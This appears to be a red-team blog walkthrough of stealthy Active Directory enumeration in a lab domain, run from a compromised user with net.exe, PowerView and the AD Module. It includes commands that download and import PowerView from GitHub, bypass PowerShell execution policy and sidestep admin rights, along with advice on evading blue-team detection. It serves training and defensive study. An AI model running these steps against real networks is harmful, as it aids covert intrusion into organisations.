# Red Teaming - Enumeration Tactics

- [Red Teaming - Enumeration Tactics](#red-teaming---enumeration-tactics)
  - [Preface](#preface)
  - [Basic Enumeration](#basic-enumeration)
  - [Recommended Enumeration Tools](#recommended-enumeration-tools)
  - [Enumerating Domain](#enumerating-domain)
  - [Enumerating Users](#enumerating-users)
  - [Enumerating User Properties](#enumerating-user-properties)
  - [Enumerating Domain Policies](#enumerating-domain-policies)
  - [Enumerating Computers](#enumerating-computers)
  - [Enumerating Computer Properties](#enumerating-computer-properties)
  - [Enumerating Groups](#enumerating-groups)
  - [Enumerating Group Members](#enumerating-group-members)
  - [Enumerating Groups Of A Specific User](#enumerating-groups-of-a-specific-user)
  - [Enumerating Group Properties](#enumerating-group-properties)

## Preface

In this blog post, we are going to cover AD enumeration techniques which are performed using native windows/active directory functions. The main reason to use these functions is to maintain stealth in an organization network to avoid unwanted detection by blue teamers.

The more you maintain stealth in the AD of an organization, the higher the probability of exploiting more resources.

Many red teamers prefer using BloodHound, ofcourse it is a wonderful tool which can be used to obtain graphical information about the AD via nodes. But it produces very aggresive noise on the network logs for a small period of time. The blue teamers, would get a solid idea of your presence. We will discuss about BloodHound in another post.

We can gain access on a domain user using 0-day exploits easily, but it is highly monitored and it will be patched and audited soon by the organization. Enterprise organizations always follow "Assume Breach Methodology" for their internal assesments. The best method used by a red teamer is to silently sneak in.

The more you enumerate the AD with patience, it will give you an eagle eye perspective for the AD. Most of the red teamers do not enumerate properly, so that they get stuck in middle of an operation/assessment. The more details you enumerate about the AD, gives you the more possibilities of exploiting it and the more leverage you have on it.

Lets start our enumeration using our compromised domain user. For enumeration, PowerShell is highly recommended to use in modern Windows systems.

## Basic Enumeration

Lets start enumerating our user using a powershell window. These can be done by any Domain User.

To view the username you are accessing in the current domain

```c
PS C:\Users\sharingan> whoami
adlab\sharingan
```

To get the name of your current computer which you are accessing

```c
PS C:\Users\sharingan> hostname
PC2021ID01
```

To get the privileges of the current user

```c
PS C:\Users\sharingan> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```

## Recommended Enumeration Tools 

We will also be using two most used tools for enumeration in a stealthy way

1. PowerView, [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)

    Can be installed from,

    [PowerShellEmpire](https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1)
    
    [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)

    Loading it inside the machine,

    ```c
    PS C:\Users\sharingan> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1 -OutFile PowerView.ps1
    PS C:\Users\sharingan> Import-Module .\PowerView.ps1
    Import-Module : File C:\Users\sharingan\PowerView.ps1 cannot be loaded because running scripts is disabled on this
    system. For more information, see about_Execution_Policies at https:/go.microsoft.com/fwlink/?LinkID=135170.
    At line:1 char:1
    + Import-Module .\PowerView.ps1
    + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        + CategoryInfo          : SecurityError: (:) [Import-Module], PSSecurityException
        + FullyQualifiedErrorId : UnauthorizedAccess,Microsoft.PowerShell.Commands.ImportModuleCommand
    ```
    We should bypass the ```ExecutionPolicy``` too, inorder to load a powershell script.

    ```c
    PS C:\Users\sharingan> powershell -ep bypass
    Windows PowerShell
    Copyright (C) Microsoft Corporation. All rights reserved.

    Try the new cross-platform PowerShell https://aka.ms/pscore6

    PS C:\Users\sharingan> Import-Module .\PowerView.ps1
    ```
2. Active Directory Module

    If you have Administrator privileges, you can easily install AD Module. It is not present by default.

    RSAT (Remote Server Administration Toolkit) should be installed

    ```c
    Import-Module Server-Manager
    Add-WindowsFeature RSAT-AD-Powershell
    ```

    Bypassing Admin rights for AD Module,
    
    We need an important DLL for this purpose

    ```c
    Microsoft.ActiveDirectory.Management.dll
    ``` 
    
    That DLL is imported via RSAT from DC to enable AD Module
    
    Location of that DLL in DC,
    
    ```c
    C:\Windows\Microsoft.NET\assembly\GAC_64\Microsoft.ActiveDirectory.Management\
    ```

    We can also do it manually, to bypass the admin rights

    [Microsoft.ActiveDirectory.Management.dll](https://github.com/samratashok/ADModule/raw/master/Microsoft.ActiveDirectory.Management.dll)

    [Import-ActiveDirectory.ps1](https://github.com/samratashok/ADModule/raw/master/Import-ActiveDirectory.ps1)

    Loading it inside the machine

    ```c
    PS C:\Users\sharingan> Invoke-WebRequest https://github.com/samratashok/ADModule/raw/master/Microsoft.ActiveDirectory.Management.dll -OutFile ADModule.dll
    PS C:\Users\sharingan> powershell -ep bypass
    Windows PowerShell
    Copyright (C) Microsoft Corporation. All rights reserved.

    Try the new cross-platform PowerShell https://aka.ms/pscore6

    PS C:\Users\sharingan> Import-Module .\Import-ActiveDirectory.ps1
    ```
    
    Now AD Module is successfully loaded without Admin rights


## Enumerating Domain

Lets start to enumerate some details about our current domain using native Windows functions.

Get the current domain information 

```c
PS C:\Users\sharingan> [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()


Forest                  : ADLab.local
DomainControllers       : {TAMILCTF-DC.ADLab.local}
Children                : {}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  :
PdcRoleOwner            : TAMILCTF-DC.ADLab.local
RidRoleOwner            : TAMILCTF-DC.ADLab.local
InfrastructureRoleOwner : TAMILCTF-DC.ADLab.local
Name                    : ADLab.local
```

From this single native function, you can literally get the details about

1. Name of the current domain
2. Forest of the current domain
3. Domain Controller (DC) of the current domain
4. Children of the current domain
5. Parent of the current domain
6. DCs with different roles

To get the IP address of the DC, you can use ```ping``` or ```nslookup```

```c
PS C:\Users\sharingan> ping ADLab.local

Pinging ADLab.local [192.168.116.134] with 32 bytes of data:
Reply from 192.168.116.134: bytes=32 time<1ms TTL=128
Reply from 192.168.116.134: bytes=32 time=1ms TTL=128
Reply from 192.168.116.134: bytes=32 time<1ms TTL=128
Reply from 192.168.116.134: bytes=32 time=1ms TTL=128

Ping statistics for 192.168.116.134:
    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
    Minimum = 0ms, Maximum = 1ms, Average = 0ms
```

```c
PS C:\Users\sharingan> nslookup ADLab.local
Server:  UnKnown
Address:  192.168.116.134

Name:    ADLab.local
Address:  192.168.116.134
```

But any interaction through DNS may be spotted, because DNS is one of the attack vector for red teamers.

Enumerating current domain using PowerView,

```c
PS C:\Users\sharingan> Get-NetDomain


Forest                  : ADLab.local
DomainControllers       : {TAMILCTF-DC.ADLab.local}
Children                : {}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  :
PdcRoleOwner            : TAMILCTF-DC.ADLab.local
RidRoleOwner            : TAMILCTF-DC.ADLab.local
InfrastructureRoleOwner : TAMILCTF-DC.ADLab.local
Name                    : ADLab.local
```

Enumerating current domain using AD Module,

```c
PS C:\Users\sharingan> Get-ADDomain


DomainSID                          : S-1-5-21-995680175-2722998285-2164436367
AllowedDNSSuffixes                 : {}
LastLogonReplicationInterval       :
DomainMode                         : Windows2016Domain
ManagedBy                          :
LinkedGroupPolicyObjects           : {cn={2F2F53C6-04A8-4F8D-9DE6-BE90DB096A3C},cn=policies,cn=system,DC=ADLab,DC=local
                                     ,
                                     CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=ADLab,DC=local}
ChildDomains                       : {}
ComputersContainer                 : CN=Computers,DC=ADLab,DC=local
DomainControllersContainer         : OU=Domain Controllers,DC=ADLab,DC=local
ForeignSecurityPrincipalsContainer : CN=ForeignSecurityPrincipals,DC=ADLab,DC=local
Forest                             : ADLab.local
InfrastructureMaster               : TAMILCTF-DC.ADLab.local
NetBIOSName                        : ADLAB
PDCEmulator                        : TAMILCTF-DC.ADLab.local
ParentDomain                       :
RIDMaster                          : TAMILCTF-DC.ADLab.local
SystemsContainer                   : CN=System,DC=ADLab,DC=local
UsersContainer                     : CN=Users,DC=ADLab,DC=local
SubordinateReferences              : {DC=ForestDnsZones,DC=ADLab,DC=local, DC=DomainDnsZones,DC=ADLab,DC=local,
                                     CN=Configuration,DC=ADLab,DC=local}
DNSRoot                            : ADLab.local
LostAndFoundContainer              : CN=LostAndFound,DC=ADLab,DC=local
DeletedObjectsContainer            : CN=Deleted Objects,DC=ADLab,DC=local
QuotasContainer                    : CN=NTDS Quotas,DC=ADLab,DC=local
ReadOnlyReplicaDirectoryServers    : {}
ReplicaDirectoryServers            : {TAMILCTF-DC.ADLab.local}
DistinguishedName                  : DC=ADLab,DC=local
Name                               : ADLab
ObjectClass                        : domainDNS
ObjectGuid                         : db306b0e-d072-414a-8e79-5fd4e7576941
PropertyNames                      : {AllowedDNSSuffixes, ChildDomains, ComputersContainer, DeletedObjectsContainer...}
AddedProperties                    : {}
RemovedProperties                  : {}
ModifiedProperties                 : {PublicKeyRequiredPasswordRolling}
PropertyCount                      : 30
```

Now, we can see many details related to the current domain.

## Enumerating Users

AD contains a lot of users. Users are objects of AD. Enumerating users will give you an idea about your target or the roles of a specific user which can be used to leverage later.

Listing users using ```net.exe``` from current domain,

```c
PS C:\Users\sharingan> net user /domain
The request will be processed at a domain controller for domain ADLab.local.


User accounts for \\TAMILCTF-DC.ADLab.local

-------------------------------------------------------------------------------
Administrator            aidenpearce369           allina.kenyon
allissa.pru              allsun.linoel            alyss.rosie
amalie.edythe            annaliese.stormy         anthiathia.ondrea
arabela.kylie            babbie.gabriel           beatriz.pearl
benita.maud              bernadene.flss           bobbee.amelia
bobette.cornelle         bonny.fionna             bridie.lonny
chelsea.lanny            clare.francoise          clementine.caroljean
coletta.sharona          corella.marie            daisi.adena
dannie.phillis           ddene.glenda             debra.meriel
dela.kelcie              dorris.sally             dorthy.hyacinthe
dyan.hertha              elly.madelon             ermengarde.noni
fawn.dora                florance.lindy           flss.pris
frederica.daniela        gabriela.caryn           george.cordi
ginger.eveleen           Guest                    hannie.conchita
holly-anne.jasmine       ibbie.irma               ibbie.lexie
ivie.gerry               jacquie.myrtice          janenna.nanette
janey.leontine           jania.lauree             joly.jenine
jordana.lyndsey          juana.ladonna            karen.kala
katharyn.lura            katya.merl               kay.annora
kayley.marylee           kirbie.sandra            kirby.arlene
konstantine.noellyn      koo.augustine            krbtgt
kynthia.elfreda          lacie.anette             laureen.quintina
lauretta.garnette        leora.netti              lian.babs
liane.cleo               lillian.harriett         lyndsay.ajay
lynne.nisse              madlen.isabelita         malissia.biddy
marita.lynda             marya.minette            max.grier
merrilee.hazel           mindy.jessi              moyra.maryanne
nadine.karlie            nana.aimil               onida.bobbie
opalina.dee dee          ophelie.federica         orelee.laurie
pam.georgie              perla.lamar              petronille.joanie
querida.jaquith          raina.constantia         rakel.maye
rebekkah.joete           ricca.lelah              rinnegan
sabine.julieta           salome.carmela           sapphire.agretha
seka.alissa              selene.kaela             sharingan
sharleen.laurianne       shay.kincaid             sibbie.pauli
sqlservice               stephi.meggie
The command completed successfully.
```

Listing users using PowerView,

```c
PS C:\Users\sharingan> Get-NetUser | Select -ExpandProperty samaccountname
Administrator
Guest
krbtgt
sharingan
aidenpearce369
rinnegan
sqlservice

...

```

Listing users using AD Module,

```c
PS C:\Users\sharingan> Get-ADUser -Filter * | Select -ExpandProperty SamAccountName
Administrator
Guest
krbtgt
sharingan
aidenpearce369
rinnegan
sqlservice

...

```

Enumerating more details about current user in PowerView,

```c
PS C:\Users\sharingan> Get-NetUser -UserName sharingan


logoncount            : 8
badpasswordtime       : 12/12/2021 9:08:00 AM
distinguishedname     : CN=Itachi Uchiha,CN=Users,DC=ADLab,DC=local
objectclass           : {top, person, organizationalPerson, user}
displayname           : Itachi Uchiha
lastlogontimestamp    : 12/12/2021 9:08:38 AM
userprincipalname     : sharingan@ADLab.local
name                  : Itachi Uchiha
objectsid             : S-1-5-21-995680175-2722998285-2164436367-1104
samaccountname        : sharingan
codepage              : 0
samaccounttype        : 805306368
whenchanged           : 12/12/2021 5:08:38 PM
accountexpires        : 9223372036854775807
countrycode           : 0
adspath               : LDAP://CN=Itachi Uchiha,CN=Users,DC=ADLab,DC=local
instancetype          : 4
usncreated            : 12791
objectguid            : b3947efe-54aa-4e75-b03c-4f6133f22933
sn                    : Uchiha
lastlogoff            : 12/31/1600 4:00:00 PM
objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=ADLab,DC=local
dscorepropagationdata : 1/1/1601 12:00:00 AM
givenname             : Itachi
lastlogon             : 12/12/2021 6:31:31 PM
badpwdcount           : 0
cn                    : Itachi Uchiha
useraccountcontrol    : 66048
whencreated           : 11/20/2021 6:54:14 PM
primarygroupid        : 513
pwdlastset            : 11/20/2021 10:54:14 AM
usnchanged            : 25426
```

You can see some important properties like logon, logoff, SID, GUID & other timestamps for a specific user. These details play an important role in future foothold.

Enumerating current user using AD Module,

```c
PS C:\Users\sharingan> Get-ADUser sharingan -Properties *


GivenName          : Itachi
Surname            : Uchiha
UserPrincipalName  : sharingan@ADLab.local
Enabled            : True
SamAccountName     : sharingan
SID                : S-1-5-21-995680175-2722998285-2164436367-1104
DistinguishedName  : CN=Itachi Uchiha,CN=Users,DC=ADLab,DC=local
Name               : Itachi Uchiha
ObjectClass        : user
ObjectGuid         : b3947efe-54aa-4e75-b03c-4f6133f22933
PropertyNames      : {AccountExpirationDate, accountExpires, AccountLockoutTime, AccountNotDelegated...}
AddedProperties    : {}
RemovedProperties  : {}
ModifiedProperties : {}
PropertyCount      : 106
```

## Enumerating User Properties

Enumerating Last logon, logoff timestamps and logon count using PowerView,

```c
PS C:\Users\sharingan> Get-UserProperty -Properties lastlogoff,lastlogon,logoncount | ft

name              lastlogoff            lastlogon              logoncount
----              ----------            ---------              ----------
Administrator     12/31/1600 4:00:00 PM 12/12/2021 6:31:18 PM          10
Guest             12/31/1600 4:00:00 PM 12/31/1600 4:00:00 PM           0
krbtgt            12/31/1600 4:00:00 PM 12/31/1600 4:00:00 PM           0
Itachi Uchiha     12/31/1600 4:00:00 PM 12/12/2021 6:31:31 PM           8
Monish Kumar      12/31/1600 4:00:00 PM 12/12/2021 10:53:12 AM          5
Nagato Uzumaki    12/31/1600 4:00:00 PM 12/12/2021 10:50:45 AM          3
SQL Database      12/31/1600 4:00:00 PM 12/31/1600 4:00:00 PM           0
Janenna Nanette   12/31/1600 4:00:00 PM 12/31/1600 4:00:00 PM           0
Lian Babs         12/31/1600 4:00:00 PM 12/31/1600 4:00:00 PM           0
George Cordi      12/31/1600 4:00:00 PM 12/31/1600 4:00:00 PM           0

...

```

Enumerate password last set time, time stamp for last bad password and number of times bad passwords used by users using PowerView

```c
PS C:\Users\sharingan> Get-UserProperty -Properties pwdlastset,badpasswordtime,badpwdcount

name              pwdlastset             badpasswordtime        badpwdcount
----              ----------             ---------------        -----------
Administrator     11/20/2021 9:55:31 AM  12/31/1600 4:00:00 PM            0
Guest             12/31/1600 4:00:00 PM  12/31/1600 4:00:00 PM            0
krbtgt            11/20/2021 10:13:15 AM 12/31/1600 4:00:00 PM            0
Itachi Uchiha     11/20/2021 10:54:14 AM 12/12/2021 9:08:00 AM            0
Monish Kumar      11/20/2021 10:58:08 AM 11/20/2021 11:59:32 AM           0
Nagato Uzumaki    11/20/2021 11:01:42 AM 11/20/2021 11:33:18 AM           0
SQL Database      11/20/2021 11:05:21 AM 12/31/1600 4:00:00 PM            0

...

```

In an enterprise AD, it is important to enumerate these properties to identify a decoy user. Bad passwords may seem like a vulnerable place to crack. But from an enterprise perspective, bad passwords are not recommended for an user by their security policies. And users with bad passwords are created as a decoy to lure the red teamers. So analysing bad password count and set time and logon count of an user can give you an understanding about normal users and decoy users.

## Enumerating Domain Policies

Domain policies are a set of security policies implemented on a domain or an AD object to implement security protocols according to their own way.

Listing available domain policies from current domain using PowerView,

```c
PS C:\Users\sharingan> Get-DomainPolicy


Unicode        : @{Unicode=yes}
SystemAccess   : @{MinimumPasswordAge=1; MaximumPasswordAge=42; LockoutBadCount=0; PasswordComplexity=0;
                 RequireLogonToChangePassword=0; LSAAnonymousNameLookup=0; ForceLogoffWhenHourExpire=0;
                 PasswordHistorySize=24; ClearTextPassword=0; MinimumPasswordLength=4}
RegistryValues : @{MACHINE\System\CurrentControlSet\Control\Lsa\NoLMHash=System.String[]}
KerberosPolicy : @{MaxTicketAge=10; MaxServiceAge=600; MaxClockSkew=5; MaxRenewAge=7; TicketValidateClient=1}
Version        : @{Revision=1; signature="$CHICAGO$"}
```

Get "System Access" policy from Domain Policies,

```c
PS C:\Users\sharingan> (Get-DomainPolicy)."SystemAccess"


MinimumPasswordAge           : 1
MaximumPasswordAge           : 42
LockoutBadCount              : 0
PasswordComplexity           : 0
RequireLogonToChangePassword : 0
LSAAnonymousNameLookup       : 0
ForceLogoffWhenHourExpire    : 0
PasswordHistorySize          : 24
ClearTextPassword            : 0
MinimumPasswordLength        : 4
```

Get "Kerberos Policy" policy from Domain Policies,

```c
PS C:\Users\sharingan> (Get-DomainPolicy)."KerberosPolicy"


MaxTicketAge         : 10
MaxServiceAge        : 600
MaxClockSkew         : 5
MaxRenewAge          : 7
TicketValidateClient : 1
```

## Enumerating Computers

Listing available computers available in current domain using PowerView,

```c
PS C:\Users\sharingan> Get-NetComputer
TAMILCTF-DC.ADLab.local
PC2021ID01.ADLab.local
PC2021ID02.ADLab.local
```

Listing available computers available in current domain using AD Module,

```c
PS C:\Users\sharingan> Get-ADComputer -Filter * | Select -ExpandProperty DNSHostName
TAMILCTF-DC.ADLab.local
PC2021ID01.ADLab.local
PC2021ID02.ADLab.local
```

## Enumerating Computer Properties

Enumerating all properties of a computer using PowerView,

```c
PS C:\Users\sharingan> Get-NetComputer -ComputerName PC2021ID01.ADLab.local -FullData


logoncount                    : 28
badpasswordtime               : 12/31/1600 4:00:00 PM
distinguishedname             : CN=PC2021ID01,CN=Computers,DC=ADLab,DC=local
objectclass                   : {top, person, organizationalPerson, user...}
badpwdcount                   : 0
lastlogontimestamp            : 12/12/2021 9:06:42 AM
objectsid                     : S-1-5-21-995680175-2722998285-2164436367-1110
samaccountname                : PC2021ID01$
localpolicyflags              : 0
codepage                      : 0
samaccounttype                : 805306369
whenchanged                   : 12/12/2021 5:06:42 PM
countrycode                   : 0
cn                            : PC2021ID01
accountexpires                : 9223372036854775807
adspath                       : LDAP://CN=PC2021ID01,CN=Computers,DC=ADLab,DC=local
instancetype                  : 4
usncreated                    : 12885
objectguid                    : 1dc76462-50bc-48ca-9d0f-393dcacbea7a
operatingsystem               : Windows 10 Enterprise Evaluation
operatingsystemversion        : 10.0 (19044)
lastlogoff                    : 12/31/1600 4:00:00 PM
objectcategory                : CN=Computer,CN=Schema,CN=Configuration,DC=ADLab,DC=local
dscorepropagationdata         : 1/1/1601 12:00:00 AM
serviceprincipalname          : {RestrictedKrbHost/PC2021ID01, HOST/PC2021ID01, RestrictedKrbHost/PC2021ID01.ADLab.local,
                                HOST/PC2021ID01.ADLab.local}
lastlogon                     : 12/12/2021 7:53:46 PM
iscriticalsystemobject        : False
usnchanged                    : 25416
useraccountcontrol            : 4096
whencreated                   : 11/20/2021 7:30:32 PM
primarygroupid                : 515
pwdlastset                    : 11/20/2021 11:30:32 AM
msds-supportedencryptiontypes : 28
name                          : PC2021ID01
dnshostname                   : PC2021ID01.ADLab.local
```

Ping all available computers using AD Module,

```c
PS C:\Users\sharingan> Get-ADComputer -Filter * -Properties DNSHostName | %{Test-Connection -Count 1 -ComputerName $_.DNSHostName}

Source        Destination     IPV4Address      IPV6Address                              Bytes    Time(ms)
------        -----------     -----------      -----------                              -----    --------
PC2021ID01    TAMILCTF-DC.... 192.168.116.134                                           32       0
PC2021ID01    PC2021ID01.A... 192.168.116.135  fe80::457c:1622:b1b6:11f4%6              32       0

[IGNORE ERROR] ...
```


## Enumerating Groups

Groups are also an AD object similar to Users. Groups are collection of AD objects which are maintained to control access to resources and maintain GPOs over them.

Listing down groups in a domain using ```net.exe```

```c
PS C:\Users\sharingan> net group /domain
The request will be processed at a domain controller for domain ADLab.local.


Group Accounts for \\TAMILCTF-DC.ADLab.local

-------------------------------------------------------------------------------
*accounting
*Cloneable Domain Controllers
*DnsUpdateProxy
*Domain Admins
*Domain Computers
*Domain Controllers
*Domain Guests
*Domain Users
*Enterprise Admins
*Enterprise Key Admins
*Enterprise Read-only Domain Controllers
*Executives
*Group Policy Creator Owners
*IT Admins
*Key Admins
*marketing
*Office Admin
*Project management
*Protected Users
*Read-only Domain Controllers
*sales
*Schema Admins
*Senior management
The command completed successfully.
```

Listing down local groups in a machine using ```net.exe```,

```c
PS C:\Users\sharingan> net localgroup

Aliases for \\PC2021ID01

-------------------------------------------------------------------------------
*Access Control Assistance Operators
*Administrators
*Backup Operators
*Cryptographic Operators
*Device Owners
*Distributed COM Users
*Event Log Readers
*Guests
*Hyper-V Administrators
*IIS_IUSRS
*Network Configuration Operators
*Performance Log Users
*Performance Monitor Users
*Power Users
*Remote Desktop Users
*Remote Management Users
*Replicator
*System Managed Accounts Group
*Users
The command completed successfully.
```

Listing all groups using PowerView,

```c
PS C:\Users\sharingan> Get-NetGroup
Administrators
Users
Guests
Print Operators
Backup Operators
Replicator
Remote Desktop Users

...

```

Listing all groups using AD Module,

```c
PS C:\Users\sharingan> Get-ADGroup -Filter * | Select samaccountname

SamAccountName
--------------
Administrators
Users
Guests
Print Operators
Backup Operators
Replicator
Remote Desktop Users

...

```

## Enumerating Group Members

Listing the members of a group using ```net.exe```

```c
PS C:\Users\sharingan> net group sales /domain
The request will be processed at a domain controller for domain ADLab.local.

Group name     sales
Comment

Members

-------------------------------------------------------------------------------
george.cordi             ivie.gerry               joly.jenine
katharyn.lura            madlen.isabelita         petronille.joanie
ricca.lelah              selene.kaela
The command completed successfully.
```

Listing the members of a group using PowerView,

```c
PS C:\Users\sharingan> Get-NetGroupMember -GroupName "Office Admin" | Select -ExpandProperty "MemberName"
salome.carmela
kynthia.elfreda
selene.kaela
ddene.glenda
```

Listing the members of a group using AD Module,

```c
PS C:\Users\sharingan> Get-ADGroupMember -Identity accounting | Select -ExpandProperty SamAccountName
bernadene.flss
flss.pris
fawn.dora
benita.maud
nana.aimil
```

## Enumerating Groups Of A Specific User

There is a chance where our user may present in an interesting AD group ( It maybe, not always mandatory to be present in a custom group. But can be present in default groups )

Enumerating groups for a specific user using PowerView,

```c
PS C:\Users\sharingan> Get-NetGroup -UserName fawn.dora
ADLAB\accounting
PS C:\Users\sharingan> Get-NetGroup -UserName salome.carmela
ADLAB\Office Admin
```

Enumerating groups for a specific user using AD Module,

```c
PS C:\Users\sharingan> Get-ADPrincipalGroupMembership -Identity fawn.dora | Select -ExpandProperty SamAccountName
Domain Users
accounting
PS C:\Users\sharingan> Get-ADPrincipalGroupMembership -Identity  salome.carmela | Select -ExpandProperty SamAccountName
Domain Users
Office Admin
```

## Enumerating Group Properties

Enumerating properties of a group using PowerView,

```c
PS C:\Users\sharingan> Get-NetGroup -GroupName "Office Admin" -FullData


usncreated            : 25196
grouptype             : -2147483646
samaccounttype        : 268435456
samaccountname        : Office Admin
whenchanged           : 12/12/2021 5:00:04 PM
objectsid             : S-1-5-21-995680175-2722998285-2164436367-1212
objectclass           : {top, group}
cn                    : Office Admin
usnchanged            : 25349
dscorepropagationdata : {12/12/2021 5:00:04 PM, 12/12/2021 5:00:04 PM, 1/1/1601 12:00:00 AM}
name                  : Office Admin
adspath               : LDAP://CN=Office Admin,CN=Users,DC=ADLab,DC=local
distinguishedname     : CN=Office Admin,CN=Users,DC=ADLab,DC=local
member                : {CN=Salome Carmela,CN=Users,DC=ADLab,DC=local, CN=Kynthia Elfreda,CN=Users,DC=ADLab,DC=local,
                        CN=Selene Kaela,CN=Users,DC=ADLab,DC=local, CN=Ddene Glenda,CN=Users,DC=ADLab,DC=local}
whencreated           : 12/12/2021 5:00:03 PM
instancetype          : 4
objectguid            : 739fd7c7-f783-40d1-833d-d7b64475e8b9
objectcategory        : CN=Group,CN=Schema,CN=Configuration,DC=ADLab,DC=local
```

We can get SID, GUID , LDAP ADs Path and even more by enumerating these.

Enumerating properties of a group using AD Module,

```c
PS C:\Users\sharingan> Get-ADGroup -Identity sales


GroupScope         : Global
GroupCategory      : Security
SamAccountName     : sales
SID                : S-1-5-21-995680175-2722998285-2164436367-1218
DistinguishedName  : CN=sales,CN=Users,DC=ADLab,DC=local
Name               : sales
ObjectClass        : group
ObjectGuid         : 84267fe7-dc67-49e6-a343-b0c768b03b2c
PropertyNames      : {DistinguishedName, GroupCategory, GroupScope, Name...}
AddedProperties    : {}
RemovedProperties  : {}
ModifiedProperties : {}
PropertyCount      : 8
```

For now this would provide a good understanding, about the compromised user and its related objects. 

Still there are more left to enumerate like OUs, GPOs, Trusts etc. We will discuss about that in later blog posts.

The harder you do enumeration, the easier you can gain foothold and pivoting.
